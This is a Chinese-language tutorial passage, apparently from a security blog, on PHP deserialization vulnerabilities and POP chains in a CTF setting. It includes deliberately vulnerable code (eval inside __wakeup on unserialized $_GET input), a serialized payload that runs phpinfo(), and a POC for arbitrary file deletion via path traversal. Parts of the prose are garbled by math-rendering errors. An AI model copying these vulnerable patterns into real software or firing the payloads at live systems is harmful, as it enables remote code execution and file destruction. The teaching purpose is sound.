<p>类的实体化结果是对象，而对象的抽象就是类。在开发过程中，我们通常都是先抽象(幻想)出一个类，再用该类去创建对象(实现幻想的内容)。在程序中，直接使用的是我们(实现幻想)的对象，而不是抽象(幻想)的类。</p>
<h4 id="~变量的属性"><a class="markdownIt-Anchor" href="#~变量的属性"></a> ~变量的属性</h4>
<p>public表示全局，类内部和外部子类都可以访问；</p>
<p>private表示私有的，只有本类内部可以使用；</p>
<p>protected表示受保护的，只有本类或子类或父类中可以访问；</p>
<h4 id="~反序列化"><a class="markdownIt-Anchor" href="#~反序列化"></a> ~反序列化</h4>
<h5 id="json_encode"><a class="markdownIt-Anchor" href="#json_encode"></a> json_encode()</h5>
<blockquote>
<p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>[,<span class="variable">$options</span> = <span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<h6 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> 参数：</h6>
<ul>
<li>
<p><strong>value</strong>: 要编码的值。该函数只对 UTF-8 编码的数据有效。</p>
</li>
<li>
<p><strong>options</strong>:由以下常量组成的二进制掩码 JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERROR。</p>
<p>要注意的是 JSON_UNESCAPED_UNICODE 选项，如果我们不希望中文被编码，可以添加该选项。</p>
</li>
</ul>
<h5 id="serialize"><a class="markdownIt-Anchor" href="#serialize"></a> serialize()</h5>
<blockquote>
<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span>(mixer <span class="variable">$value</span>)</span><br></pre></td></tr></table></figure>
<h6 id="参数value要序列化的对象或数组"><a class="markdownIt-Anchor" href="#参数value要序列化的对象或数组"></a> 参数：$value:要序列化的对象或数组。</h6>
<h5 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize"></a> unserialize()</h5>
<blockquote>
<p><strong>unserialize()</strong> 函数用于将通过 <a href="https://www.runoob.com/php/php-serialize-function.html">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">unserialize</span>(<span class="keyword">string</span> <span class="variable">$str</span>)</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>$str:序列化后的字符串。</p>
<h5 id="演示"><a class="markdownIt-Anchor" href="#演示"></a> 演示：</h5>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png" alt="image-20221006202111066"></p>
<h3 id="二-反序列化漏洞"><a class="markdownIt-Anchor" href="#二-反序列化漏洞"></a> 二、反序列化漏洞</h3>
<p>为啥会产生这个漏洞呢？</p>
<p>首先，我们先来了解一下什么是魔术方法！</p>
<h4 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__invoke()当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化unserialize()之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化serialize()之后立即被调用</span><br><span class="line"></span><br><span class="line">__call 在对象中调用一个不可访问方法时调用。(必须满足两个参数)</span><br><span class="line"></span><br><span class="line">__get 获得一个类的成员变量时调用;在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br></pre></td></tr></table></figure>
<h5 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$f1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;(s)(e)(r)(i)(a)(l)(i)(z)(e)(!)&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_unserialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&quot;size&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size-<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString tigger&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is __invoke&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_serialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hource</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png" alt="test"></p>
<p>这里就算给出了Demo，同样不好理解怎么就是反序列化漏洞了？</p>
<h5 id="demo01-__wokeup"><a class="markdownIt-Anchor" href="#demo01-__wokeup"></a> Demo01-__wokeup()</h5>
<p>这里我们来用__wokeup()来做一个漏洞演示：</p>
<p>首先来看一下反序列化实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;SCR&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018214636570-16672739578743.png" alt="image-20221018214636570"></p>
<p>接下来就是漏洞实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>01.可控参数是GET型string参数</p>
<p>02.后端接收参数后进行反序列化操作</p>
<p>03.test类中存在__wakeup魔术方法，操作是eval($id)</p>
<p>构建POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011016911-16672739578732.png" alt="image-20221019011016911"></p>
<p>直接使用链子：O:4:“test”:1:{s:1:“a”;s:10:“phpinfo();”;}</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011242914-16672739578744.png" alt="image-20221019011242914"></p>
<p>到此，反序列化的产生原因我不言而喻了吧！</p>
<h2 id="php反序列化常见考点"><a class="markdownIt-Anchor" href="#php反序列化常见考点"></a> php反序列化常见考点</h2>
<h3 id="pop链"><a class="markdownIt-Anchor" href="#pop链"></a> POP链</h3>
<p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p>
<p><mark>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</mark></p>
<h4 id="实例复现"><a class="markdownIt-Anchor" href="#实例复现"></a> 实例复现</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$user_data</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="审计源码"><a class="markdownIt-Anchor" href="#审计源码"></a> 审计源码：</h5>
<p>首先我们看最限制行的操作在最下面反序列化GET到的参数data，然后执行echo (user_data，这里如果)user_data是一个类实例化来的对象的话，就会触发对象中的__tostring()魔术方法</p>
<p>接着来单独分析每个类中的函数关系:</p>
<p>Test1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 首先声明了$obj变量</p>
<p>.2 类中有______construct()和__tostring()魔术方法，__construct()方法为(obj变量赋值为Test3类的实例化对象，__tostring()方法判断如果)obj变量存在则返回调用$obj对象中的Delete()函数</p>
<p>Test2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1首先声明了$cache_file变量</p>
<p>.2 定义了Delete()函数，如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</p>
<p>Test3：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 定义了Delete()函数，次函数只返回一句话，没有敏感操作，为安全函数</p>
<h5 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> <em>POP链构造</em></h5>
<p>首先出发点是Test1中的______tostring()魔术方法，其中调用了(this-&gt;obj中的Delete()函数，而)this-&gt;obj是在实例化对象是触发______construct方法，将<span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 80: …的执行流如下 `Test1类→_̲_construct()→">this-&gt;obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下 `Test1类→__construct()→</span>this-&gt;obj=new Test3→__tostring()→Test3.Delete<code>方法 不过在Test2类中也定义了和Test3中同名的函数Delete()，那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下 </code>Test1类→__construct()→$this-&gt;obj=new Test2→__tostring()→Test2.Delete方法` 那么POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p>
<h5 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="php原生类总结"><a class="markdownIt-Anchor" href="#php原生类总结"></a> PHP原生类总结</h3>
<p>其实，在CTF题目中，可以利用php原生类来进行XSS,反序列化，SSRF，XXE和读文件的思路</p>
<p>通过遍历看一下php的内置类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Generator</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable 